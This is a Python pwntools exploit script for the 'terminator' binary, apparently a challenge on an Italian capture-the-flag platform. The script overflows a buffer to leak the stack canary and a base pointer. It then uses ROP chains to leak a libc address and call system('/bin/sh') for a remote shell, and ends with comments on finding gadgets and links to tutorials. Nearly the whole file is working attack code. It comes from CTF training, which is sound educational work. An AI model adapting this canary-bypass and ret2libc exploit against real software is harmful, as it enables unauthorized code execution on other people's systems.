#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template terminator '--host=terminator.challs.olicyber.it' '--port=10307'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'terminator_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

def leak_canary_basepointer():
    io.sendlineafter(b"> ", b"A" * 55)
    io.recvline()
    io.recvline()
    canary_basepointer = io.recvline()
    canary = b"\x00" + canary_basepointer[:7]
    base_pointer = canary_basepointer[7:13]
    return int.from_bytes(canary, byteorder="little"), int.from_bytes(base_pointer, byteorder="little")

def step1():
    payload = flat(
            NULL_BYTE, 
            p64(POP_RDI_RET),
            p64(exe.got.puts),
            p64(exe.plt.puts),
            p64(exe.sym.main)
        )

    payload = payload.ljust(56, b"A")

    payload += flat(
            canary.to_bytes(8, "little"),
            buffer.to_bytes(8, "little")
        )

    return payload

def step2():
    payload = flat(
            NULL_BYTE, 
            p64(POP_RDI_RET),
            p64(next(libc.search(b"/bin/sh"))),
            p64(RET),
            p64(libc.sym.system)
        )

    payload = payload.ljust(56, b"A")

    payload += flat(
            canary.to_bytes(8, "little"),
            buffer.to_bytes(8, "little")
        )

    return payload

NULL_BYTE = 0x0
POP_RDI_RET = 0x4012fb
RET = 0x401016

io = start()

canary, base_pointer = leak_canary_basepointer()
buffer = base_pointer - 96

log.success(f"Indirizzo del canary = {hex(canary)}")
log.success(f"Indirizzo del buffer = {hex(buffer)}")

payload1 = step1()

io.sendafter(b"> ", payload1)
io.recvline()

puts = int.from_bytes(io.recvline()[:-1], byteorder="little")
log.success(f"indirizzo dei puts: {hex(puts)}")
libc.address = puts - libc.sym.puts
log.success(f"Indirizzo della libc = {hex(libc.address)}")

canary, base_pointer = leak_canary_basepointer()
buffer = base_pointer - 96
log.success(f"Indirizzo del buffer (main n.2)= {hex(buffer)}")

payload2 = step2()
io.sendlineafter(b"> ", payload2)

io.interactive()


#strings -a -t x libc.so.6 | grep "/bin/sh"
#rabin2 -s libc.so.6 | grep system
#leak-got = https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got
#stak-pivoting = https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting